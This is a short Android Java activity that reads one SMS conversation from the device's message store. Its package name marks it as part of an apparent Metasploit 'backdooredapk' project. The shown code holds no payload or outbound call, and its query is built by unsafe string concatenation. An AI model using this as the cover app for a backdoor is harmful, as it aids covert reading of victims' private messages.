package stage.metasploit.com.backdooredapk;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by Grunt on 15/02/2017.
 */

public class ConversationActivity extends Activity {

    private List<SMS> getFullConversation(String thread_id) {
        Uri uri = Uri.parse("content://sms");
        String where = "thread_id==" + thread_id;
        Cursor mycursor = getContentResolver().query(uri, null, where, null, "date ASC");
        ArrayList<SMS> smsList = new ArrayList<>();
        if(mycursor != null) {
            while (mycursor.moveToNext()) {
                smsList.add(new SMS(mycursor.getString(mycursor.getColumnIndexOrThrow("body")), mycursor.getString(mycursor.getColumnIndexOrThrow("type"))));
            }

            mycursor.close();
        }
        return smsList;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_conversation);
    }
}
